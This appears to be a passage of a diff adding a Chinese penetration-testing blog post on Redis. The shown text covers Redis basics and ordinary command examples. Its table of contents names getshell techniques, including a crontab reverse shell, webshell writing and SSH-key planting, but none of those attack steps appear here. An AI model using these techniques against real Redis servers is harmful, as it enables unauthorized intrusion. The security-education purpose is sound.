@@ -1,0 +1,389 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Redis与getshell"><meta name="keywords" content="webshell,mysql,Redis"><meta name="author" content="V0WKeep3r,v0wldl@163.com"><meta name="copyright" content="V0WKeep3r"><title>Redis与getshell | V0W's Blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="V0W's Blog" type="application/atom+xml">
+</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-Redis%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 Redis简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-Redis%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AF%9E%E7%94%9F"><span class="toc-text">1.1 Redis为什么诞生</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-Redis%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">1.2 Redis是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-Redis%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">1.3 Redis应用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Redis%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">0x02 Redis基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-Redis%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-text">2.1 Redis的数据类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#String%E7%B1%BB%E5%9E%8B"><span class="toc-text">String类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E7%B1%BB%E5%9E%8Bhash"><span class="toc-text">哈希类型hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E8%A1%A8%E7%B1%BB%E5%9E%8Blist%EF%BC%9A"><span class="toc-text">列表类型list：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9B%86%E5%90%88%E7%B1%BB%E5%9E%8Bset%EF%BC%9A"><span class="toc-text">集合类型set：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-Redis%E7%89%B9%E6%80%A7"><span class="toc-text">2.2 Redis特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E7%89%B9%E6%80%A71%EF%BC%9A%E4%BA%8B%E5%8A%A1"><span class="toc-text">Redis特性1：事务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E7%89%B9%E6%80%A72%EF%BC%9A%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85-Pub-Sub"><span class="toc-text">Redis特性2：发布订阅(Pub&#x2F;Sub)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E7%89%B9%E6%80%A73%EF%BC%9AStream"><span class="toc-text">Redis特性3：Stream</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-Redis%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-text">2.3 Redis的命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-Redis%E8%BF%9E%E6%8E%A5"><span class="toc-text">2.3.1 Redis连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-2-%E8%8E%B7%E5%8F%96Redis%E4%BF%A1%E6%81%AF"><span class="toc-text">2.3.2 获取Redis信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-3-String-%E7%B1%BB%E5%9E%8B%E5%91%BD%E4%BB%A4"><span class="toc-text">2.3.3 String 类型命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-4-hash%E7%B1%BB%E5%9E%8B%E5%91%BD%E4%BB%A4"><span class="toc-text">2.3.4 hash类型命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-5-List%E7%B1%BB%E5%9E%8B%E5%91%BD%E4%BB%A4"><span class="toc-text">2.3.5 List类型命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-6-Set%E7%B1%BB%E5%9E%8B%E5%91%BD%E4%BB%A4"><span class="toc-text">2.3.6 Set类型命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Redis-%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">0x03 Redis 在渗透测试中的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">3.1 Redis未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="toc-text">3.2 信息泄漏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Redis-getshell"><span class="toc-text">3.3 Redis getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-1-%E5%88%A9%E7%94%A8Redis%E5%86%99%E5%85%AC%E9%92%A5-%E8%BF%9B%E8%A1%8Cssh%E8%BF%9E%E6%8E%A5"><span class="toc-text">3.3.1 利用Redis写公钥 进行ssh连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-2-%E5%88%A9%E7%94%A8Redis-%E5%86%99-crontab%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">3.3.2 利用Redis 写 crontab任务反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-3-%E5%88%A9%E7%94%A8Redis-%E5%86%99webshell"><span class="toc-text">3.3.3 利用Redis 写webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-4-%E5%88%A9%E7%94%A8Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6getshell"><span class="toc-text">3.3.4 利用Redis主从复制getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-Redis%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1"><span class="toc-text">0x04 Redis安全防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xFF-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">0xFF 参考链接</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/Kaneki.jpg"></div><div class="author-info__name text-center">V0WKeep3r</div><div class="author-info__description text-center">Stay Hungry, Stay Foolish.</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/qingchenldl">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">56</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">30</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">11</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://zhuxianjin.github.io/">J0k3r</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://daolgts.github.io/">dlgts</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://iwenhu.cn/">mengchen</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0sec.net/">p0</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://asa9ao.xyz/">唯湖</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://www.nicefish.top/posts/">nicefish</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://flag0.com/">GetFlag</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/index.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">V0W's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于我</a></span></div><div id="post-info"><div id="post-title">Redis与getshell</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-05</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">5.8k</span><span class="post-meta__separator">|</span><span>阅读时长: 23 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文主要介绍redis技术是什么，有什么优势，有什么缺点。接着会从安全渗透的角度，剖析其存在的安全隐患，四种getshell的利用方式和防护策略。</p>
+<h1 id="0x01-Redis简介"><a href="#0x01-Redis简介" class="headerlink" title="0x01 Redis简介"></a>0x01 Redis简介</h1><h2 id="1-1-Redis为什么诞生"><a href="#1-1-Redis为什么诞生" class="headerlink" title="1.1 Redis为什么诞生"></a>1.1 Redis为什么诞生</h2><p>首先，Redis是NoSQL的典型案例之一。那么为什么SQL（关系型数据库）用的好好的，突然出现一个NoSQL呢？</p>
+<p>在Web应用发展的初期，那时关系型数据库受到了较为广泛的关注和应用，原因是因为那时候Web站点基本上访问和并发不高、交互也较少。而在后来，随着访问量的提升，使用关系型数据库的Web站点多多少少都开始在性能上出现了一些瓶颈，而瓶颈的源头一般是在磁盘的I/O上。而随着互联网技术的进一步发展，各种类型的应用层出不穷，这导致在当今云计算、大数据盛行的时代，对性能有了更多的需求，主要体现在以下四个方面：</p>
+<ol>
+<li>低延迟的读写速度：应用快速地反应能极大地提升用户的满意度</li>
+<li>支撑海量的数据和流量：对于搜索这样大型应用而言，需要利用PB级别的数据和能应对百万级的流量</li>
+<li>大规模集群的管理：系统管理员希望分布式应用能更简单的部署和管理</li>
+<li>庞大运营成本的考量：IT部门希望在硬件成本、软件成本和人力成本能够有大幅度地降低</li>
+</ol>
+<p>为了克服这一问题，NoSQL应运而生，它同时具备了高性能、可扩展性强、高可用等优点，受到广泛开发人员和仓库管理人员的青睐。</p>
+<h2 id="1-2-Redis是什么"><a href="#1-2-Redis是什么" class="headerlink" title="1.2 Redis是什么"></a>1.2 Redis是什么</h2><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库，其具备如下特性：</p>
+<ul>
+<li>基于内存运行，性能高效</li>
+<li>支持分布式，理论上可以无限扩展</li>
+<li>key-value存储系统</li>
+<li>开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API</li>
+</ul>
+<p>相比于其他数据库类型，Redis具备的特点是：</p>
+<ul>
+<li>C/S通讯模型</li>
+<li>单进程单线程模型</li>
+<li>丰富的数据类型</li>
+<li>操作具有原子性</li>
+<li>持久化</li>
+<li>高并发读写</li>
+<li>支持lua脚本</li>
+</ul>
+<p>哪些大厂在使用Redis？</p>
+<ul>
+<li>github</li>
+<li>twitter</li>
+<li>微博</li>
+<li>Stack Overflow</li>
+<li>阿里巴巴</li>
+<li>百度</li>
+<li>美团</li>
+<li>搜狐</li>
+</ul>
+<h2 id="1-3-Redis应用场景"><a href="#1-3-Redis应用场景" class="headerlink" title="1.3 Redis应用场景"></a>1.3 Redis应用场景</h2><p>Redis 的应用场景包括：缓存系统（“热点”数据：高频读、低频写）、计数器、消息队列系统、排行榜、社交网络和实时系统。</p>
+<h1 id="0x02-Redis基础知识"><a href="#0x02-Redis基础知识" class="headerlink" title="0x02 Redis基础知识"></a>0x02 Redis基础知识</h1><h2 id="2-1-Redis的数据类型"><a href="#2-1-Redis的数据类型" class="headerlink" title="2.1 Redis的数据类型"></a>2.1 Redis的数据类型</h2><p>五种自有数据类型：String类型、哈希类型、列表类型、集合类型和顺序集合类型。</p>
+<h3 id="String类型"><a href="#String类型" class="headerlink" title="String类型"></a>String类型</h3><p>不仅能够存储字符串、还能存储图片、视频等多种类型, 最大长度支持512M。</p>
+<p>对每种数据类型，Redis都提供了丰富的操作命令，如：</p>
+<ul>
+<li>GET/MGET</li>
+<li>SET/SETEX/MSET/MSETNX</li>
+<li>INCR/DECR</li>
+<li>GETSET</li>
+<li>DEL</li>
+</ul>
+<h3 id="哈希类型hash"><a href="#哈希类型hash" class="headerlink" title="哈希类型hash"></a>哈希类型hash</h3><p>该类型是由field和关联的value组成的map。其中，field和value都是字符串类型的。</p>
+<p>Hash的操作命令如下：</p>
+<ul>
+<li>HGET/HMGET/HGETALL</li>
+<li>HSET/HMSET/HSETNX</li>
+<li>HEXISTS/HLEN</li>
+<li>HKEYS/HDEL</li>
+<li>HVALS</li>
+</ul>
+<h3 id="列表类型list："><a href="#列表类型list：" class="headerlink" title="列表类型list："></a>列表类型list：</h3><p>该类型是一个插入顺序排序的字符串元素集合, 基于双链表实现。</p>
+<p>List的操作命令如下：</p>
+<ul>
+<li>LPUSH/LPUSHX/LPOP/RPUSH/RPUSHX/RPOP/LINSERT/LSET</li>
+<li>LINDEX/LRANGE</li>
+<li>LLEN/LTRIM</li>
+</ul>
+<h3 id="集合类型set："><a href="#集合类型set：" class="headerlink" title="集合类型set："></a>集合类型set：</h3><p>Set类型是一种无顺序集合, 它和List类型最大的区别是：集合中的元素没有顺序, 且元素是唯一的。</p>
+<p>Set类型的底层是通过哈希表实现的，其操作命令为：</p>
+<ul>
+<li>SADD/SPOP/SMOVE/SCARD</li>
+<li>SINTER/SDIFF/SDIFFSTORE/SUNION</li>
+</ul>
+<p>Set类型主要应用于：在某些场景，如社交场景中，通过交集、并集和差集运算，通过Set类型可以非常方便地查找共同好友、共同关注和共同偏好等社交关系。</p>
+<h2 id="2-2-Redis特性"><a href="#2-2-Redis特性" class="headerlink" title="2.2 Redis特性"></a>2.2 Redis特性</h2><h3 id="Redis特性1：事务"><a href="#Redis特性1：事务" class="headerlink" title="Redis特性1：事务"></a>Redis特性1：事务</h3><ul>
+<li>命令序列化，按顺序执行</li>
+<li>原子性</li>
+<li>三阶段: 开始事务 - 命令入队 - 执行事务</li>
+<li>命令：MULTI/EXEC/DISCARD</li>
+</ul>
+<h3 id="Redis特性2：发布订阅-Pub-Sub"><a href="#Redis特性2：发布订阅-Pub-Sub" class="headerlink" title="Redis特性2：发布订阅(Pub/Sub)"></a>Redis特性2：发布订阅(Pub/Sub)</h3><ul>
+<li>Pub/sub是一种消息通讯模式</li>
+<li>Pub发送消息, Sub接受消息</li>
+<li>Redis客户端可以订阅任意数量的频道</li>
+<li>“fire and forgot”, 发送即遗忘</li>
+<li>命令：Publish/Subscribe/Psubscribe/UnSub</li>
+</ul>
+<p>　　<img src="http://image.v0w.top/Blog/2020-08-09-092255.png"></p>
+<h3 id="Redis特性3：Stream"><a href="#Redis特性3：Stream" class="headerlink" title="Redis特性3：Stream"></a>Redis特性3：Stream</h3><ul>
+<li>Redis 5.0新增</li>
+<li>等待消费</li>
+<li>消费组(组内竞争)</li>
+<li>消费历史数据</li>
+<li>FIFO</li>
+</ul>
+<p><img src="http://image.v0w.top/Blog/2020-08-09-092350.jpg"></p>
+<h2 id="2-3-Redis的命令"><a href="#2-3-Redis的命令" class="headerlink" title="2.3 Redis的命令"></a>2.3 Redis的命令</h2><p>最详细的命令还是要参考手册</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.redis.net.cn/order/">https://www.redis.net.cn/order/</a></li>
+<li><a target="_blank" rel="noopener" href="http://redisdoc.com/">http://redisdoc.com/</a></li>
+<li><a target="_blank" rel="noopener" href="http://redisguide.com/">http://redisguide.com/</a></li>
+</ul>
+<h3 id="2-3-1-Redis连接"><a href="#2-3-1-Redis连接" class="headerlink" title="2.3.1 Redis连接"></a>2.3.1 Redis连接</h3><p><strong>本地连接</strong></p>
+<p>确定本地redis服务启动后。启动 redis 客户端，打开终端并输入命令 redis-cli。该命令会连接本地的 redis 服务。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;redis-server		# 启动redis服务</span><br><span class="line"></span><br><span class="line"> .&#x2F;redis-cli		# 启动redis客户端，连接本地服务</span><br><span class="line">127.0.0.1:6379&gt; PING	# 测试redis的连通性</span><br><span class="line">PONG</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>远程连接</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ redis-cli -h host -p port -a password</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-3-2-获取Redis信息"><a href="#2-3-2-获取Redis信息" class="headerlink" title="2.3.2 获取Redis信息"></a>2.3.2 获取Redis信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO		# 查看信息</span><br><span class="line"># Server</span><br><span class="line">redis_version:6.0.6</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">KEYS *		# 看所有键</span><br><span class="line">1) &quot;key&quot;</span><br><span class="line">2) &quot;key-with-expire-time&quot;</span><br><span class="line"></span><br><span class="line">flushall	# 删除所有数据库内容</span><br><span class="line"></span><br><span class="line">flushdb		# 刷新数据库</span><br><span class="line"></span><br><span class="line">config set dir dirpath 设置路径等配置</span><br><span class="line"></span><br><span class="line">config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;src&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-3-3-String-类型命令"><a href="#2-3-3-String-类型命令" class="headerlink" title="2.3.3 String 类型命令"></a>2.3.3 String 类型命令</h3><p>String 介绍稍微详细一点，其他的也是类似的，所以就简单介绍。</p>
+<p><strong>SET 系列</strong></p>
+<ol>
+<li><p><code>SET key value [EX seconds] [PX milliseconds] [NX|XX]</code> </p>
+<p>将字符串值 <code>value</code> 关联到 <code>key</code> 。</p>
+<p>如果 <code>key</code> 已经持有其他值， <code>SET</code> 就覆写旧值， 无视类型。</p>
+</li>
+<li><p><code>SETNX key value</code></p>
+<p>只在键 <code>key</code> 不存在的情况下， 将键 <code>key</code> 的值设置为 <code>value</code> 。</p>
+<p>若键 <code>key</code> 已经存在， 则 <code>SETNX</code> 命令不做任何动作。</p>
+<p><code>SETNX</code> 是『SET if Not eXists』(如果不存在，则 SET)的简写。</p>
+</li>
+<li><p><code>SETEX key seconds value</code></p>
+<p>将键 <code>key</code> 的值设置为 <code>value</code> ， 并将键 <code>key</code> 的生存时间设置为 <code>seconds</code> 秒钟。</p>
+<p>如果键 <code>key</code> 已经存在， 那么 <code>SETEX</code> 命令将覆盖已有的值。</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对不存在的键进行设置：</span><br><span class="line">redis&gt; SET key &quot;value&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key</span><br><span class="line">&quot;value&quot;</span><br><span class="line"></span><br><span class="line">对已存在的键进行设置：</span><br><span class="line">redis&gt; SET key &quot;new-value&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key</span><br><span class="line">&quot;new-value&quot;</span><br><span class="line"></span><br><span class="line">使用 EX 选项：将键的过期时间设置为 seconds 秒。</span><br><span class="line">redis&gt; SET key-with-expire-time &quot;hello&quot; EX 10086</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key-with-expire-time</span><br><span class="line">&quot;hello&quot;</span><br><span class="line">redis&gt; TTL key-with-expire-time</span><br><span class="line">(integer) 10069</span><br><span class="line"></span><br><span class="line">使用 PX 选项：将键的过期时间设置为 milliseconds 毫秒。</span><br><span class="line">redis&gt; SET key-with-pexpire-time &quot;moto&quot; PX 123321</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key-with-pexpire-time</span><br><span class="line">&quot;moto&quot;</span><br><span class="line">redis&gt; PTTL key-with-pexpire-time</span><br><span class="line">(integer) 111939</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用 NX 选项：只在键不存在时， 才对键进行设置操作</span><br><span class="line">redis&gt; SET not-exists-key &quot;value&quot; NX</span><br><span class="line">OK      # 键不存在，设置成功</span><br><span class="line">redis&gt; GET not-exists-key</span><br><span class="line">&quot;value&quot;</span><br><span class="line">redis&gt; SET not-exists-key &quot;new-value&quot; NX</span><br><span class="line">(nil)   # 键已经存在，设置失败</span><br><span class="line">redis&gt; GEt not-exists-key</span><br><span class="line">&quot;value&quot; # 维持原值不变</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用 XX 选项：只在键已经存在时， 才对键进行设置操作</span><br><span class="line">redis&gt; EXISTS exists-key</span><br><span class="line">(integer) 0</span><br><span class="line">redis&gt; SET exists-key &quot;value&quot; XX</span><br><span class="line">(nil)   # 因为键不存在，设置失败</span><br><span class="line">redis&gt; SET exists-key &quot;value&quot;</span><br><span class="line">OK      # 先给键设置一个值</span><br><span class="line">redis&gt; SET exists-key &quot;new-value&quot; XX</span><br><span class="line">OK      # 设置新值成功</span><br><span class="line">redis&gt; GET exists-key</span><br><span class="line">&quot;new-value&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>GET系列</strong></p>
+<p><code>GET key</code>: 如果键 <code>key</code> 不存在， 那么返回特殊值 <code>nil</code> ； 否则， 返回键 <code>key</code> 的值。</p>
+<p>如果键 <code>key</code> 的值并非字符串类型， 那么返回一个错误， 因为 <code>GET</code> 命令只能用于字符串值。</p>
+<p><code>GETSET key value</code>: 将键 <code>key</code> 的值设为 <code>value</code> ， 并返回键 <code>key</code> 在被设置之前的旧值。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edis&gt; GETSET db mongodb    # 没有旧值，返回 nil</span><br><span class="line">(nil)</span><br><span class="line"></span><br><span class="line">redis&gt; GET db</span><br><span class="line">&quot;mongodb&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; GETSET db redis      # 返回旧值 mongodb</span><br><span class="line">&quot;mongodb&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; GET db</span><br><span class="line">&quot;redis&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>APPEND key value</strong></p>
+<p>如果键 <code>key</code> 已经存在并且它的值是一个字符串， <code>APPEND</code> 命令将把 <code>value</code> 追加到键 <code>key</code> 现有值的末尾。</p>
+<p>如果 <code>key</code> 不存在， <code>APPEND</code> 就简单地将键 <code>key</code> 的值设为 <code>value</code> ， 就像执行 <code>SET key value</code> 一样。</p>
+<p>追加 <code>value</code> 之后， 返回键 <code>key</code> 的值的长度。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对不存在的 key 执行 APPEND ：</span><br><span class="line"></span><br><span class="line">redis&gt; EXISTS myphone               # 确保 myphone 不存在</span><br><span class="line">(integer) 0</span><br><span class="line">redis&gt; APPEND myphone &quot;nokia&quot;       # 对不存在的 key 进行 APPEND ，等同于 SET myphone &quot;nokia&quot;</span><br><span class="line">(integer) 5                         # 字符长度</span><br><span class="line"></span><br><span class="line">对已存在的字符串进行 APPEND ：</span><br><span class="line"></span><br><span class="line">redis&gt; APPEND myphone &quot; - 1110&quot;     # 长度从 5 个字符增加到 12 个字符</span><br><span class="line">(integer) 12</span><br><span class="line">redis&gt; GET myphone</span><br><span class="line">&quot;nokia - 1110&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>STRLEN key</strong></p>
+<p>返回键 <code>key</code> 储存的字符串值的长度。</p>
+<p>获取字符串值的长度：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET mykey &quot;Hello world&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; STRLEN mykey</span><br><span class="line">(integer) 11</span><br></pre></td></tr></table></figure>
+
+<p>不存在的键的长度为 <code>0</code> ：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; STRLEN nonex</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>APPEND key value</strong></p>
+<p>如果键 <code>key</code> 已经存在并且它的值是一个字符串， <code>APPEND</code> 命令将把 <code>value</code> 追加到键 <code>key</code> 现有值的末尾。</p>
+<p>如果 <code>key</code> 不存在， <code>APPEND</code> 就简单地将键 <code>key</code> 的值设为 <code>value</code> ， 就像执行 <code>SET key value</code> 一样。</p>
+<p><strong>SETRANGE key offset value</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET greeting &quot;hello world&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; SETRANGE greeting 6 &quot;Redis&quot;</span><br><span class="line">(integer) 11</span><br><span class="line"></span><br><span class="line">redis&gt; GET greeting</span><br><span class="line">&quot;hello Redis&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>GETRANGE key start end</strong></p>
+<p>返回键 <code>key</code> 储存的字符串值的指定部分， 字符串的截取范围由 <code>start</code> 和 <code>end</code> 两个偏移量决定 (包括 <code>start</code> 和 <code>end</code> 在内)。</p>
+<p>负数偏移量表示从字符串的末尾开始计数， <code>-1</code> 表示最后一个字符， <code>-2</code> 表示倒数第二个字符， 以此类推。</p>
+<p><code>GETRANGE</code> 通过保证子字符串的值域(range)不超过实际字符串的值域来处理超出范围的值域请求。</p>
+<p>类似SubStr命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET greeting &quot;hello, my friend&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GETRANGE greeting 0 4          # 返回索引0-4的字符，包括4。</span><br><span class="line">&quot;hello&quot;</span><br><span class="line">redis&gt; GETRANGE greeting -1 -5        # 不支持回绕操作</span><br><span class="line">&quot;&quot;</span><br><span class="line">redis&gt; GETRANGE greeting -3 -1        # 负数索引</span><br><span class="line">&quot;end&quot;</span><br><span class="line">redis&gt; GETRANGE greeting 0 -1         # 从第一个到最后一个</span><br><span class="line">&quot;hello, my friend&quot;</span><br><span class="line">redis&gt; GETRANGE greeting 0 1008611    # 值域范围不超过实际字符串，超过部分自动被符略</span><br><span class="line">&quot;hello, my friend&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>MSET key value [key value …]</strong></p>
+<p>同时对多个键进行设置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; MSET date &quot;2012.3.30&quot; time &quot;11:00 a.m.&quot; weather &quot;sunny&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET date time weather</span><br><span class="line">1) &quot;2012.3.30&quot;</span><br><span class="line">2) &quot;11:00 a.m.&quot;</span><br><span class="line">3) &quot;sunny&quot;</span><br></pre></td></tr></table></figure>
+
+<p>覆盖已有的值：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; MGET k1 k2</span><br><span class="line">1) &quot;hello&quot;</span><br><span class="line">2) &quot;world&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; MSET k1 &quot;good&quot; k2 &quot;bye&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET k1 k2</span><br><span class="line">1) &quot;good&quot;</span><br><span class="line">2) &quot;bye&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>MGET key [key …]</strong></p>
+<p>返回给定的一个或多个字符串键的值。</p>
